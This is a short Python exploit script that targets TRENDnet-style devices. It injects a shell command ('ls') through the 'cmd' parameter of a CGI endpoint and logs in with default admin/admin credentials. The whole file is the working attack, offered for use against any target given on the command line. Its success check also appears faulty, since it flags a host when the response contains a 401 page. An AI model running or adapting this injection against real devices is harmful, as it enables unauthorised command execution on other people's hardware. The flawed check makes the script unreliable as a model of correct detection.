from sys import exit
import argparse, requests

from requests.auth import HTTPBasicAuth


def main():
    # parse args
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target URL to attack", required=True)
    parser.add_argument("--user", help="Username on target", required=False)
    parser.add_argument("--passw", help="Password on target", required=False)
    args = parser.parse_args()
    target = "http://" + args.target
    user = args.user if args.user else "admin"
    passw = args.passw if args.passw else "admin"

    cmd="ls"
    req = requests.get(f"{target}/cgi/maker/ptcmd.cgi?cmd=;{cmd}", auth=HTTPBasicAuth(user, passw))
    if "401.html" in req.text:
        print(f"{target}:trendnet_exploit")
        exit(0)
    else:
        exit(0)



if __name__ == "__main__":
    main()